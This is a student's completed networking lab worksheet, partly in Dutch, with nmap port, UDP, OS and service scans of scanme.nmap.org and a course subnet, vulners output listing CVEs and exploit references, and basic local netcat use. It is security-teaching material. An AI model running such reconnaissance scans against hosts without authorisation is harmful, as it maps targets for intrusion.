# Lab 3: Nmap/Netcat

## Nmap
As seen in the video's, nmap is a tool allowing you to explore remote networks, or the details of a certain host. The software, and information on how to use it, can be found on https://nmap.org/book/

### Nmap port scanning
Let us start with exploring the tool using the testing site of the tool itself: http://scanme.nmap.org/

1. Execute a simple scan on scanme.nmap.org . Which ports are open?
    ```console
    $ nmap scanme.nmap.org
    Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-22 19:20 CET
    Nmap scan report for scanme.nmap.org (45.33.32.156)
    Host is up (0.21s latency).
    Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f
    Not shown: 995 closed ports
    PORT      STATE    SERVICE
    22/tcp    open     ssh
    25/tcp    filtered smtp
    80/tcp    open     http
    9929/tcp  open     nping-echo
    31337/tcp open     Elite

    Nmap done: 1 IP address (1 host up) scanned in 12.99 seconds
    ```

2. Has nmap scanned all 65535 possible ports on scanme.nmap.org? How many has it actually scanned? How can you scan all ports?
    ```
    Nee, nmap scant standaard de top 1000 ports van het opgegeven protocol (hier tcp)
    ```
    ```console
    $ nmap -p 1-65535 scanme.nmap.org
    ```

3. You'll notice only TCP ports are listed, how can you scan for UDP ports? Start a scan on UDP ports (for some time). Already read the next question.
    ```console
    $ sudo nmap -sU scanme.nmap.org
    Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-05 19:23 CE
    
    ```


4. You are now probably waiting quite some time and no (UDP) ports show up. Why? How can you speed up the process by only scanning for the 20 most common ports? How long does this take? Which open ports do you find?
    ```
    UDP verwacht dat juiste payload, anders geen response
    ```

    ```console
    $ sudo nmap --top-ports 20 -sU scanme.nmap.org    
    Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-22 19:25 CET
    Nmap scan report for scanme.nmap.org (45.33.32.156)
    Host is up (0.17s latency).
    Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f

    PORT      STATE         SERVICE
    53/udp    open|filtered domain
    67/udp    open|filtered dhcps
    68/udp    open|filtered dhcpc
    69/udp    closed        tftp
    123/udp   open          ntp
    135/udp   open|filtered msrpc
    137/udp   closed        netbios-ns
    138/udp   closed        netbios-dgm
    139/udp   closed        netbios-ssn
    161/udp   closed        snmp
    162/udp   open|filtered snmptrap
    445/udp   open|filtered microsoft-ds
    500/udp   open|filtered isakmp
    514/udp   closed        syslog
    520/udp   open|filtered route
    631/udp   open|filtered ipp
    1434/udp  open|filtered ms-sql-m
    1900/udp  open|filtered upnp
    4500/udp  open|filtered nat-t-ike
    49152/udp open|filtered unknown

    Nmap done: 1 IP address (1 host up) scanned in 8.16 seconds
    ```

5. Let's go back to scanning TCP ports only. How can we detect which operating system and services run on these ports using nmap? Hint: https://nmap.org/book/man-os-detection.html
    ```console
    sudo nmap -O -sV scanme.nmap.org
    Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-22 19:29 CET
    Nmap scan report for scanme.nmap.org (45.33.32.156)
    Host is up (0.16s latency).
    Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f
    Not shown: 995 closed ports
    PORT      STATE    SERVICE    VERSION
    22/tcp    open     ssh        OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
    25/tcp    filtered smtp
    80/tcp    open     http       Apache httpd 2.4.7 ((Ubuntu))
    9929/tcp  open     nping-echo Nping echo
    31337/tcp open     tcpwrapped
    Aggressive OS guesses: HP P2000 G3 NAS device (93%), Linux 2.6.32 (92%), Linux 2.6.32 - 3.1 (92%), Infomir MAG-250 set-top box (92%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (92%), Linux 3.7 (92%), Ubiquiti AirOS 5.5.9 (92%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (92%), Linux 2.6.32 - 3.13 (92%), Linux 3.0 - 3.2 (92%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 14 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 21.67 seconds
    ```

6. `nmap` has support to run scripts. One of these scripts is the vulners script to see which vulnerabilities exist on the detected ports. See https://github.com/vulnersCom/nmap-vulners for more information. Which vulnerabilities do you detect for the SSH server at scanme.nmap.org ?
    ```
    $ nmap -sV --script vulners scanme.nmap.org
    Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-05 19:33 CET
    Nmap scan report for scanme.nmap.org (45.33.32.156)
    Host is up (0.17s latency).
    Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f
    Not shown: 995 closed ports
    PORT      STATE    SERVICE    VERSION
    22/tcp    open     ssh        OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
    | vulners: 
    |   cpe:/a:openbsd:openssh:6.6.1p1: 
    |     	CVE-2015-5600	8.5	https://vulners.com/cve/CVE-2015-5600
    |     	MSF:ILITIES/GENTOO-LINUX-CVE-2015-6564/	6.9	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2015-6564/	*EXPLOIT*
    |     	CVE-2015-6564	6.9	https://vulners.com/cve/CVE-2015-6564
    |     	CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919
    |     	CVE-2021-41617	4.4	https://vulners.com/cve/CVE-2021-41617
    |     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	*EXPLOIT*
    |     	MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	*EXPLOIT*
    |     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
    |     	CVE-2015-5352	4.3	https://vulners.com/cve/CVE-2015-5352
    |     	MSF:ILITIES/ALPINE-LINUX-CVE-2015-6563/	1.9	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2015-6563/	*EXPLOIT*
    |_    	CVE-2015-6563	1.9	https://vulners.com/cve/CVE-2015-6563
    25/tcp    filtered smtp
    80/tcp    open     http       Apache httpd 2.4.7 ((Ubuntu))
    |_http-server-header: Apache/2.4.7 (Ubuntu)
    | vulners: 
    |   cpe:/a:apache:http_server:2.4.7: 
    |     	CVE-2021-44790	7.5	https://vulners.com/cve/CVE-2021-44790
    |     	CVE-2021-39275	7.5	https://vulners.com/cve/CVE-2021-39275
    |     	CVE-2021-26691	7.5	https://vulners.com/cve/CVE-2021-26691
    |     	CVE-2017-7679	7.5	https://vulners.com/cve/CVE-2017-7679
    |     	CVE-2017-3167	7.5	https://vulners.com/cve/CVE-2017-3167
    |     	PACKETSTORM:127546	6.8	https://vulners.com/packetstorm/PACKETSTORM:127546	*EXPLOIT*
    |     	MSF:ILITIES/UBUNTU-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/	*EXPLOIT*
    |     	MSF:ILITIES/UBUNTU-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/SUSE-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/GENTOO-LINUX-CVE-2014-0226/	6.8	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2014-0226/	*EXPLOIT*
    |     	MSF:ILITIES/FREEBSD-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/DEBIAN-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-17790/	6.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-17790/	*EXPLOIT*
    |     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/	*EXPLOIT*
    |     	MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/	*EXPLOIT*
    |     	FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	6.8	https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	*EXPLOIT*
    |     	CVE-2021-40438	6.8	https://vulners.com/cve/CVE-2021-40438
    |     	CVE-2020-35452	6.8	https://vulners.com/cve/CVE-2020-35452
    |     	CVE-2018-1312	6.8	https://vulners.com/cve/CVE-2018-1312
    |     	CVE-2017-15715	6.8	https://vulners.com/cve/CVE-2017-15715
    |     	CVE-2014-0226	6.8	https://vulners.com/cve/CVE-2014-0226
    |     	4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	6.8	https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	*EXPLOIT*
    |     	1337DAY-ID-22451	6.8	https://vulners.com/zdt/1337DAY-ID-22451	*EXPLOIT*
    |     	CVE-2021-44224	6.4	https://vulners.com/cve/CVE-2021-44224
    |     	CVE-2017-9788	6.4	https://vulners.com/cve/CVE-2017-9788
    |     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	*EXPLOIT*
    |     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	*EXPLOIT*
    |     	CVE-2019-0217	6.0	https://vulners.com/cve/CVE-2019-0217
    |     	CVE-2020-1927	5.8	https://vulners.com/cve/CVE-2020-1927
    |     	CVE-2019-10098	5.8	https://vulners.com/cve/CVE-2019-10098
    |     	1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577	*EXPLOIT*
    |     	CVE-2016-5387	5.1	https://vulners.com/cve/CVE-2016-5387
    |     	SSV:96537	5.0	https://vulners.com/seebug/SSV:96537	*EXPLOIT*
    |     	SSV:61874	5.0	https://vulners.com/seebug/SSV:61874	*EXPLOIT*
    |     	MSF:ILITIES/UBUNTU-CVE-2018-1303/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/	*EXPLOIT*
    |     	MSF:ILITIES/UBUNTU-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/	*EXPLOIT*
    |     	MSF:ILITIES/SUSE-CVE-2014-0231/	5.0	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2014-0231/	*EXPLOIT*
    |     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	*EXPLOIT*
    |     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/	*EXPLOIT*
    |     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/	*EXPLOIT*
    |     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/	*EXPLOIT*
    |     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-2161/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-2161/	*EXPLOIT*
    |     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-0736/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-0736/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/	*EXPLOIT*
    |     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/	*EXPLOIT*
    |     	MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	*EXPLOIT*
    |     	EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7	5.0	https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7	*EXPLOIT*
    |     	EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	5.0	https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	*EXPLOIT*
    |     	EDB-ID:42745	5.0	https://vulners.com/exploitdb/EDB-ID:42745	*EXPLOIT*
    |     	EDB-ID:40961	5.0	https://vulners.com/exploitdb/EDB-ID:40961	*EXPLOIT*
    |     	CVE-2021-34798	5.0	https://vulners.com/cve/CVE-2021-34798
    |     	CVE-2021-26690	5.0	https://vulners.com/cve/CVE-2021-26690
    |     	CVE-2020-1934	5.0	https://vulners.com/cve/CVE-2020-1934
    |     	CVE-2019-17567	5.0	https://vulners.com/cve/CVE-2019-17567
    |     	CVE-2019-0220	5.0	https://vulners.com/cve/CVE-2019-0220
    |     	CVE-2018-17199	5.0	https://vulners.com/cve/CVE-2018-17199
    |     	CVE-2018-1303	5.0	https://vulners.com/cve/CVE-2018-1303
    |     	CVE-2017-9798	5.0	https://vulners.com/cve/CVE-2017-9798
    |     	CVE-2017-15710	5.0	https://vulners.com/cve/CVE-2017-15710
    |     	CVE-2016-8743	5.0	https://vulners.com/cve/CVE-2016-8743
    |     	CVE-2016-2161	5.0	https://vulners.com/cve/CVE-2016-2161
    |     	CVE-2016-0736	5.0	https://vulners.com/cve/CVE-2016-0736
    |     	CVE-2015-3183	5.0	https://vulners.com/cve/CVE-2015-3183
    |     	CVE-2015-0228	5.0	https://vulners.com/cve/CVE-2015-0228
    |     	CVE-2014-0231	5.0	https://vulners.com/cve/CVE-2014-0231
    |     	CVE-2014-0098	5.0	https://vulners.com/cve/CVE-2014-0098
    |     	CVE-2013-6438	5.0	https://vulners.com/cve/CVE-2013-6438
    |     	1337DAY-ID-28573	5.0	https://vulners.com/zdt/1337DAY-ID-28573	*EXPLOIT*
    |     	1337DAY-ID-26574	5.0	https://vulners.com/zdt/1337DAY-ID-26574	*EXPLOIT*
    |     	SSV:87152	4.3	https://vulners.com/seebug/SSV:87152	*EXPLOIT*
    |     	PACKETSTORM:127563	4.3	https://vulners.com/packetstorm/PACKETSTORM:127563	*EXPLOIT*
    |     	MSF:ILITIES/UBUNTU-CVE-2018-1302/	4.3	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/	*EXPLOIT*
    |     	MSF:ILITIES/UBUNTU-CVE-2018-1301/	4.3	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/	*EXPLOIT*
    |     	MSF:ILITIES/SUSE-CVE-2014-0118/	4.3	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2014-0118/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/	*EXPLOIT*
    |     	MSF:ILITIES/DEBIAN-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/	*EXPLOIT*
    |     	MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	*EXPLOIT*
    |     	MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	*EXPLOIT*
    |     	MSF:ILITIES/AMAZON-LINUX-AMI-ALAS-2014-389/	4.3	https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-ALAS-2014-389/	*EXPLOIT*
    |     	MSF:ILITIES/ALPINE-LINUX-CVE-2014-0117/	4.3	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2014-0117/	*EXPLOIT*
    |     	CVE-2020-11985	4.3	https://vulners.com/cve/CVE-2020-11985
    |     	CVE-2019-10092	4.3	https://vulners.com/cve/CVE-2019-10092
    |     	CVE-2018-1302	4.3	https://vulners.com/cve/CVE-2018-1302
    |     	CVE-2018-1301	4.3	https://vulners.com/cve/CVE-2018-1301
    |     	CVE-2016-4975	4.3	https://vulners.com/cve/CVE-2016-4975
    |     	CVE-2015-3185	4.3	https://vulners.com/cve/CVE-2015-3185
    |     	CVE-2014-8109	4.3	https://vulners.com/cve/CVE-2014-8109
    |     	CVE-2014-0118	4.3	https://vulners.com/cve/CVE-2014-0118
    |     	CVE-2014-0117	4.3	https://vulners.com/cve/CVE-2014-0117
    |     	4013EC74-B3C1-5D95-938A-54197A58586D	4.3	https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D	*EXPLOIT*
    |     	1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575	*EXPLOIT*
    |     	MSF:ILITIES/UBUNTU-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/	*EXPLOIT*
    |     	MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/	*EXPLOIT*
    |     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/	*EXPLOIT*
    |     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/	*EXPLOIT*
    |     	MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/	*EXPLOIT*
    |     	CVE-2018-1283	3.5	https://vulners.com/cve/CVE-2018-1283
    |     	CVE-2016-8612	3.3	https://vulners.com/cve/CVE-2016-8612
    |     	PACKETSTORM:140265	0.0	https://vulners.com/packetstorm/PACKETSTORM:140265	*EXPLOIT*
    |     	MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/	0.0	https://vulners.com/metasploit/MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/	*EXPLOIT*
    |     	1337DAY-ID-601	0.0	https://vulners.com/zdt/1337DAY-ID-601	*EXPLOIT*
    |     	1337DAY-ID-2237	0.0	https://vulners.com/zdt/1337DAY-ID-2237	*EXPLOIT*
    |     	1337DAY-ID-1415	0.0	https://vulners.com/zdt/1337DAY-ID-1415	*EXPLOIT*
    |_    	1337DAY-ID-1161	0.0	https://vulners.com/zdt/1337DAY-ID-1161	*EXPLOIT*
    9929/tcp  open     nping-echo Nping echo
    31337/tcp open     tcpwrapped
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 20.26 seconds
    ```

7. Extra: `104.131.102.149` is a server for a free open source game. Can you find out which port (UDP/TCP) is used for this game? Can you connect to the server and play this game (Remember, the game client is free)? Tip: this question could take quite some time (both from you as from nmap). Hint: https://wiki.minetest.net/Setting_up_a_server
    ```
    TODO
    ```


### Nmap Host/Network scanning
The servers used in the previous lab can be found in the 157.193.215.170/29 network. Let's see who else is in that network.

1. Use nmap to find all hosts in this network. Use a simple 'ping scan'. How many hosts do you find? Hint: https://nmap.org/book/man-host-discovery.html
    ```console
    $ nmap -sn 157.193.215.170/29
    Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-05 19:39 CET
    Nmap scan report for home.test.atlantis.ugent.be (157.193.215.170)
    Host is up (0.025s latency).
    Nmap scan report for www.test.atlantis.ugent.be (157.193.215.171)
    Host is up (0.034s latency).
    Nmap scan report for mail.test.atlantis.ugent.be (157.193.215.172)
    Host is up (0.026s latency).
    Nmap done: 8 IP addresses (3 hosts up) scanned in 1.24 seconds
    ```

2. Can you get the same (or more) results without sending any packets to the hosts? Can DNS give you some more information? This should also be a lot faster (check the duration of the scan at the end of the output). Same hint as above!
    ```console
    $ nmap -sL 157.193.215.170/29
    Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-05 19:53 CET
    Nmap scan report for 157.193.215.168
    Nmap scan report for 157.193.215.169
    Nmap scan report for home.test.atlantis.ugent.be (157.193.215.170)
    Nmap scan report for www.test.atlantis.ugent.be (157.193.215.171)
    Nmap scan report for mail.test.atlantis.ugent.be (157.193.215.172)
    Nmap scan report for hylas173.test.atlantis.ugent.be (157.193.215.173)
    Nmap scan report for labwiki.test.atlantis.ugent.be (157.193.215.174)
    Nmap scan report for chaos175.test.atlantis.ugent.be (157.193.215.175)
    Nmap done: 8 IP addresses (0 hosts up) scanned in 0.07 seconds
    ```
    ```
    TODO: DNS
    ```
    

3. Only some servers were visible in the first scan - but we know there can be more as the subnet mask allows more IPs. Can you explain why not all showed up in your first scan
    ```
    Packets worden geblokkeerd door firewall.
    ```

4. How can you find all hosts with an open FTP port on this network?
    ```console
    $ nmap -p 21 157.193.215.170/29
    Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-05 19:51 CET
    Nmap scan report for home.test.atlantis.ugent.be (157.193.215.170)
    Host is up (0.021s latency).

    PORT   STATE SERVICE
    21/tcp open  ftp

    Nmap scan report for www.test.atlantis.ugent.be (157.193.215.171)
    Host is up (0.034s latency).

    PORT   STATE SERVICE
    21/tcp open  ftp

    Nmap scan report for mail.test.atlantis.ugent.be (157.193.215.172)
    Host is up (0.030s latency).

    PORT   STATE    SERVICE
    21/tcp filtered ftp

    Nmap done: 8 IP addresses (3 hosts up) scanned in 1.63 seconds
    ```

5. Do a more detailed (top-port) scan on servers 157.193.215.171 and 157.193.215.172. Which services do you see active?
    ```console
    $ nmap 157.193.215.171 157.193.215.172
    Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-05 20:09 CET
    Nmap scan report for www.test.atlantis.ugent.be (157.193.215.171)
    Host is up (0.048s latency).
    Not shown: 987 filtered ports
    PORT     STATE  SERVICE
    21/tcp   open   ftp
    80/tcp   open   http
    2000/tcp open   cisco-sccp
    4000/tcp closed remoteanything
    4001/tcp closed newoak
    4002/tcp closed mlchat-proxy
    4003/tcp closed pxc-splr-ft
    4004/tcp closed pxc-roid
    4005/tcp closed pxc-pin
    4006/tcp closed pxc-spvr
    4045/tcp closed lockd
    5060/tcp open   sip
    8008/tcp open   http

    Nmap scan report for mail.test.atlantis.ugent.be (157.193.215.172)
    Host is up (0.039s latency).
    Not shown: 995 filtered ports
    PORT     STATE  SERVICE
    22/tcp   open   ssh
    80/tcp   closed http
    110/tcp  open   pop3
    2000/tcp open   cisco-sccp
    8008/tcp open   http

    Nmap done: 2 IP addresses (2 hosts up) scanned in 28.65 seconds
    ```

6. Let's SSH into `157.193.215.170`. You can scan both hosts `157.193.215.171` and `157.193.215.172` from this server. As they are in the same subnet, there is no firewall at all between you and the servers. Compare the results from an external scan (above) with these of this internal scan.
    ```console
    $ nmap 157.193.215.171 157.193.215.172

    Starting Nmap 7.40 ( https://nmap.org ) at 2022-01-05 20:12 CET
    Nmap scan report for www.test.atlantis.ugent.be (157.193.215.171)
    Host is up (0.00047s latency).
    Not shown: 996 closed ports
    PORT   STATE SERVICE
    21/tcp open  ftp
    22/tcp open  ssh
    53/tcp open  domain
    80/tcp open  http

    Nmap scan report for mail.test.atlantis.ugent.be (157.193.215.172)
    Host is up (0.00033s latency).
    Not shown: 997 closed ports
    PORT    STATE SERVICE
    22/tcp  open  ssh
    25/tcp  open  smtp
    110/tcp open  pop3

    Nmap done: 2 IP addresses (2 hosts up) scanned in 0.11 seconds
    ```
    ```
    Er worden minder ports gescand bij de interne scan + scan is sneller
    ```
    

Beware: if you found something on these servers, which might be a problem or a hole to attack... Just inform the administrator! Be an ethical explorer.

Firewalls can be hard to detect, and block many things. A server online, having almost any port open is http://portquiz.net/. How can this be useful to test the presence of a firewall?
```
Geen response op tcp ports betekent automatisch dat de packets worden geblokkeerd door een firewall/router
```



## Netcat
Netcat is a great tool which allows you to connect to a single port (once you have found it by using nmap!). It allows for banner grabbing, retrieving more info from the service running on the port, etc... Let's explore this tool. We will start in our own linux, using multiple terminal windows.

## Netcat - Transfering data
1. Open 2 terminals. In the first terminal, let netcat listen on port `11337`. On the second terminal, connect to port `11337`. Can you send the string Hello world! from the second terminal to the first? Keep the listening socket active!
    ```console
    $ nc -l 11337
    Hello world!
    ```
    ```console
    $ nc localhost 11337
    Hello world!
    ```

2. Create a file `test.txt` with the content `Another hello world!`. How can you calculate the SHA256 value for this file on the command line? Keep this terminal open, so you have the checksum before you.
    ```console
    $ sha256sum test.txt 
    64c167319c933591cb387875d819f5156e60fb66dc673996be2f83c150c38418  test.txt
    ```

